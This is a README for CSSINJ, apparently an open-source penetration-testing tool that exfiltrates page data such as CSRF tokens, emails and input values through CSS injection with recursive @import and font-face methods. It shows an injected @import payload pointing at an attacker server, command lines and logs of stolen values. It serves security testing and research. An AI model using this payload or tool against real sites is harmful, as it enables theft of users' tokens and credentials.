---

# CSSINJ  

```
  _____   _____   _____  _____  _   _       _     _____  __     __
 / ____| / ____| / ____||_   _|| \ | |     | |   |  __ \ \ \   / /
| |     | (___  | (___    | |  |  \| |     | |   | |__) | \ \_/ /
| |      \___ \  \___ \   | |  | . ` | _   | |   |  ___/   \   /
| |____  ____) | ____) | _| |_ | |\  || |__| | _ | |        | |
 \_____||_____/ |_____/ |_____||_| \_| \____/ (_)|_|        |_|
```

## About  

**CSSINJ** is a penetration testing tool that exploits [**CSS injection vulnerabilities**](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/11-Client-side_Testing/05-Testing_for_CSS_Injection) to exfiltrate sensitive information from web applications. This tool is designed for security professionals to assess the security posture of web applications by demonstrating how CSS can be used to extract data covertly.  


## Installation  

To install and set up **CSSINJ** from Source, run the following commands:  

```bash
git clone https://github.com/DonAsako/CSSinj.git
cd CSSinj
python3 -m venv venv  
source venv/bin/activate
python3 -m pip install --upgrade pip
python3 -m pip install --upgrade build
python3 -m build
python3 -m pip install .
```

Now you’re ready to use **CSSINJ**! 🎯  

## Usage  

```bash
python3 -m cssinj [-h] -H HOSTNAME -p PORT [-e ELEMENT] [-a ATTRIBUT] [-d] [-m {recusive,font-face}] [-o OUTPUT]
```

### Options  

| Option                 | Description                                 |
|------------------------|---------------------------------------------|
| `-h, --help`           | Show help message and exit                  |
| `-H, --hostname`       | Attacker hostname or IP address             |
| `-p, --port`           | Port number of the attacker                 |
| `-e, --element`        | HTML element to extract specific data       |
| `-a, --attribut`       | Specify an element Attribute Selector for exfiltration     |
| `-d, --details`        | Show detailed logs of the exfiltration process, including extracted data |
| `-m, --method`        | Specify the type of exfiltration (recusive or font-face) |
| `-o, --output`        | File to store the exfiltrated data in JSON format |

### Example  

#### Victim's View :
```html
<h1>Welcome on my page !</h1>
<input type="text" id="username" value="admin" disabled>
<input type="email" id="email" value="admin@admin.XX" disabled>
<input type="text" class="csrf" value="MySecretAdminToken" hidden>
<img src="XXXXXXXXXXX.XX">
...
<style>
  @import url('//localhost:5005/start');
</style>
...
```

#### Recursive attack
###### Using a specific HTML identifier : 

```bash
~ python3 CSSINJ.py inject -H 127.0.0.1 -p 5005 -e input
  _____   _____   _____  _____  _   _       _     _____  __     __
 / ____| / ____| / ____||_   _|| \ | |     | |   |  __ \ \ \   / /
| |     | (___  | (___    | |  |  \| |     | |   | |__) | \ \_/ /
| |      \___ \  \___ \   | |  | . ` | _   | |   |  ___/   \   /
| |____  ____) | ____) | _| |_ | |\  || |__| | _ | |        | |
 \_____||_____/ |_____/ |_____||_| \_| \____/ (_)|_|        |_|

[2025-03-11 03:06:49] 🛠️ Attacker's server started on 127.0.0.1:5005
[2025-03-11 03:06:49] 🌐 Connection from ::1
[2025-03-11 03:06:49] ⚙️ ID : 1
[2025-03-11 03:06:49] ✅ [1] - The value exfiltrated from input is : MySecretAdminToken
[2025-03-11 03:06:49] ✅ [1] - The value exfiltrated from input is : admin@admin.XX
[2025-03-11 03:06:49] ✅ [1] - The value exfiltrated from input is : admin
```

###### Using a specific CSS attribute selector and a generic HTML identifier:

```bash
~ python3 CSSINJ.py -H 127.0.0.1 -p 5005 -e * -a src
  _____   _____   _____  _____  _   _       _     _____  __     __
 / ____| / ____| / ____||_   _|| \ | |     | |   |  __ \ \ \   / /
| |     | (___  | (___    | |  |  \| |     | |   | |__) | \ \_/ /
| |      \___ \  \___ \   | |  | . ` | _   | |   |  ___/   \   /
| |____  ____) | ____) | _| |_ | |\  || |__| | _ | |        | |
 \_____||_____/ |_____/ |_____||_| \_| \____/ (_)|_|        |_|

[2025-03-11 03:06:49] 🛠️ Attacker's server started on 127.0.0.1:5005
[2025-03-11 03:06:49] 🌐 Connection from ::1
[2025-03-11 03:06:49] ⚙️ ID : 1
[2025-03-11 03:06:49] ✅ [1] - The src exfiltrated from * is : XXXXXXXXXXX.XX
```

#### Font-face attack
```bash
~ python3 -m cssinj -H 127.0.0.1 -p 5005 -e h1 --method font-face
  _____   _____   _____  _____  _   _       _     _____  __     __
 / ____| / ____| / ____||_   _|| \ | |     | |   |  __ \ \ \   / /
| |     | (___  | (___    | |  |  \| |     | |   | |__) | \ \_/ /
| |      \___ \  \___ \   | |  | . ` | _   | |   |  ___/   \   /
| |____  ____) | ____) | _| |_ | |\  || |__| | _ | |        | |
 \_____||_____/ |_____/ |_____||_| \_| \____/ (_)|_|        |_|

[2025-05-21 03:06:49] 🛠️ Attacker's server started on 127.0.0.1:5005
[2025-05-21 03:06:49] 🌐 Connection from 127.0.0.1
[2025-05-21 03:06:49] ⚙️ ID : 1
[2025-05-21 03:06:49] 🔎 [1] - Exfiltrating element 0 :  
[2025-05-21 03:06:49] 🔎 [1] - Exfiltrating element 0 : e
[2025-05-21 03:06:49] 🔎 [1] - Exfiltrating element 0 : W
[2025-05-21 03:06:49] 🔎 [1] - Exfiltrating element 0 : l
[2025-05-21 03:06:49] 🔎 [1] - Exfiltrating element 0 : c
[2025-05-21 03:06:49] 🔎 [1] - Exfiltrating element 0 : o
[2025-05-21 03:06:49] 🔎 [1] - Exfiltrating element 0 : m
[2025-05-21 03:06:49] 🔎 [1] - Exfiltrating element 0 : n
[2025-05-21 03:06:49] 🔎 [1] - Exfiltrating element 0 : y
[2025-05-21 03:06:49] 🔎 [1] - Exfiltrating element 0 : p
[2025-05-21 03:06:49] 🔎 [1] - Exfiltrating element 0 : a
[2025-05-21 03:06:49] 🔎 [1] - Exfiltrating element 0 : g
[2025-05-21 03:06:49] 🔎 [1] - Exfiltrating element 0 : !
```

## Browser-Specific Behavior

The success of CSS injection attacks using @import depends on the browser's handling of CSS imports:
- Chromium-based browsers (Chrome, Edge, Brave, etc.) allow recursive CSS imports and will process the injected styles, making them vulnerable to exfiltration techniques using @import.

- Firefox, however, handles @import differently:
  - Unlike Chromium-based browsers, Firefox processes all @import rules before applying any styles.
  - As a result, the attack fails because the browser never processes the CSS selectors, preventing data exfiltration.
  - This behavior causes an infinite loop where the browser keeps waiting for a CSS update that never happens.

This difference in behavior makes Chromium-based browsers more susceptible to CSS injection exfiltration, while Firefox provides better protection against such attacks.

## Todo
- General : 
  - [ ] Add error Handler
    - [ ] File error Handler
  - [ ] Add test
  - [ ] Edit Terminal

- Injection : 
  - [x] Add injection parameters
  - [ ] Add an option to save results to a file
  - [ ] Allow multiple CSS selectors for simultaneous extraction
  - [ ] Add g all of the page
  - [x] Refract cssinjector.py
  - [ ] Add timeout


## Disclaimer  

This tool is intended **only for ethical hacking and security research**. **Unauthorized use on systems without explicit permission is illegal**. The developer **is not responsible** for any misuse of this tool.  

## Author  

**CSSINJ** was developed by **Asako**.
